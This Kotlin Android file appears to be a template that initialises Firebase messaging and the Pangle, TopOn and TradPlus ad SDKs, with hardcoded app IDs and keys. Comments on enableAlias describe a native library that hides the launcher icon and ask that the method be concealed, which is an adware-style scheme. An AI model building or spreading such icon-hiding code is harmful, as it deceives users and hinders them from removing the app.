package com.demo

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import com.bytedance.sdk.openadsdk.api.PAGMInitSuccessModel
import com.bytedance.sdk.openadsdk.api.PAGMUserInfoForSegment
import com.bytedance.sdk.openadsdk.api.init.PAGMConfig
import com.bytedance.sdk.openadsdk.api.init.PAGMSdk
import com.bytedance.sdk.openadsdk.api.model.PAGErrorModel
import com.google.firebase.Firebase
import com.google.firebase.analytics.analytics
import com.google.firebase.messaging.messaging
import com.thinkup.core.api.TUSDK
import com.tradplus.ads.open.TradPlusSdk

/**
 * Date：2025/10/19
 * Describe:
 */
class DemoOtherInit {
    // 需要数据持久化
    private var isInitSuccess = false
    fun initOther(context: Context) {
        //FCM
        if (isInitSuccess) return
        // todo modify name 同时把这个名字填到需求文档中
        Firebase.messaging.subscribeToTopic("topic").addOnSuccessListener {
            isInitSuccess = true
        }
    }
    // 显示桌面Icon
    // 这个方法需要传入给钟哥so中隐藏launcher icon的路径，
    // App启动后调用一次，生命周期中只调用一次，注意隐藏一下这个方法不要暴露的在太外面
    // todo modify

    fun enableAlias(alias: String, context: Context) {
        val pm = context.packageManager
        pm.setComponentEnabledSetting(
            ComponentName(context, alias),
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    // 记得持久化
    private var setTag = ""

    private fun str(ref: String) {
        // 拿到ref后进行判断
        setTag = if (ref.contains("facebook") || ref.contains("fb4a")) {
            "facebook"
        } else if (ref.contains("tiktok") || ref.contains("bytedance")) {
            "tiktok"
        } else if (ref.contains("gclid")) {
            "GoogleAds"
        } else {
            ""
        }
    }

    // todo
    // 广告Sdk初始化自行查阅官方文档
    fun adSdkInit(context: Context) {
        // pangle 聚合  https://bytedance.larkoffice.com/docx/CpOPd7w9doxh76xKChdcI0C3nky
        val info = PAGMUserInfoForSegment.Builder().setChannel(setTag).build()

        val mPAGMConfig = PAGMConfig.Builder()
            .appId("8580262")
            .setConfigUserInfoForSegment(info)
            .debugLog(true) // todo remove
            .build()
        PAGMSdk.init(context, mPAGMConfig, object : PAGMSdk.PAGMInitCallback {
            override fun success(p0: PAGMInitSuccessModel?) {}
            override fun fail(p0: PAGErrorModel?) {}
        })

        //不需要这个聚合请删除 topon聚合 https://portal.toponad.com/m/sdk/download
        TUSDK.init(context, "h670e13c4e3ab6", "ac360a993a659579a11f6df50b9e78639") // todo modify
        //不需要这个聚合请先删除 tradplus聚合 https://docs.tradplusad.com/en/docs/tradplussdk_android_doc_v6/download/?isLogin=1&email=bGl1YW5odWklNDB0ZXN0YmlyZC5jb20=
        TradPlusSdk.initSdk(context, "114FE8DB631B3389BDDDD15D81E45E39")
    }
}